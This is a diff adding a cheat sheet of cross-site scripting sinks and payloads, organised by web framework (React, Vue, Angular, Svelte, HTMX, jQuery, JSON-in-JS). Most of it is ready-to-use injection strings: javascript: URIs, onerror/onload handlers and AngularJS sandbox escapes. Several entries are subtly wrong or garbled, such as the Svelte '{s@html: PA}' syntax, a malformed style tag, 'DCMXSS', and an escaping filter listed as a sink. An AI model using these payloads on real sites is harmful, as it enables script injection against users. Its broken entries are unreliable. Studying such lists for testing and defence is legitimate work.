@@ -1,0 +1,55 @@
+# FRAMEWORK-SPECIFIC XSS MATRIX (2026)
+# SPA frameworks often sanitize/escape differently. Know the sink per framework.
+
+## 1) React
+# XSS carries on:  dangerouslySetInnerHTML, and attribute values (href/src) with javascript: scheme.
+<div dangerouslySetInnerHTML={{__html: PA}}/>          # innerHTML sink - <script> won't run, img onerror will
+<a href={PA}>link</a>                                    # javascript:alert(1) works
+<img src={PA}/>                                          # some filters strip
+# React CVEs: CVE-2015-1300 (e.g. jsx-attrs); fixed. Modern attack: prototype pollution.
+#if you see __html everywhere - DCMXSS candidates:
+autofocus onfocus=alert(1) tabindex=1                    # no JS eval - pure DOM
+# in event handler strings:  <img src=x onerror={PA}/>  -> PA like: alert(1)
+
+## 2) Vue (v-html, v-bind, templates never escaped)
+<div v-html="PA"></div>                                 # raw HTML - img onerror
+<a :href="PA">x</a>                                      # javascript:
+# Vue template injection (server-side render context / no sandbox):
+{{constructor.constructor('alert(1)')()}}
+{{$_ (1)()}}                                             # Vue 2.x classic
+# Vue directives:  v-on:click="alert(1)"  or  onsubmit="..."ng
+# v-if template parse:  <template v-if="PA">
+
+## 3) Angular (old 1.x sandbox; 2+ uses DOM sanitizer bypass via mXSS)
+{{$eval('alert(1)')}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}                      # Angular 1.x lab solid
+{{constructor.constructor('alert(1)')()}}
+{{[].pop.constructor('alert(1)')()}}
+# 2+: bypass DomSanitizer through innerHTML + bypass-trusted-templates direct:
+<div [innerHTML]="PA"></div>                             # sanitized - need mXSS/DOMPurify bypass
+<img [src]="javascript:alert(1)">                        # sanitizer blocks scheme - try svg onerror
+# AngularJS + query:  ?x={{constructor.constructor('alert(1)')()}}   (JS-literal context)
+
+## 4) Svelte (compiles; expressions protected but style= still works)
+<style background:url(javascript:alert(1))>              # CSP usually blocks; test
+{s@html: PA}                                             # innerHTML sink - img onerror
+
+## 5) HTMX (hx-get with values in attributes)
+<div hx-get="/x" hx-trigger="load" hx-swap="outerHTML">  # SSRF/XSS when hx-swap='innerHTML' w/ user input
+<input hx-post="/api" hx-target="#out">                  # injection via header values HX-Trigger
+
+## 6) jQuery (still everywhere in legacy)
+$.html(PA)           $.append(PA)  .after()  .insertAdjacentHTML()
+$(location.hash)     # selector injection:  $(('#'+hashFromUrl)) - use: <img src=x onerror=alert(1)>
+$(location.search)   # same family (csv lab)
+# .on('click') with <a href=PA> route -> javascript: sink
+
+## 7) JSON-in-JS (CDN / API echoed)
+{"user":"x","img":"javascript:alert(1)"} -> src attribute render
+# classic double-encode bypass:
+{"msg":"\u003csvg onload=alert(1)\u003e"}
+{"msg":"<img/x/onerror=\"alert(1)\">"}    # attribute-slash separation (no spaces)
+
+## 8) Blazer/Django/Jinja (server-side templates) - see SSTI folder for the full chain.
+# XSS-shipping template keywords to sniff:  |safe , {{ |e }} twig, .innerHTML, dangerouslySetInnerHTML
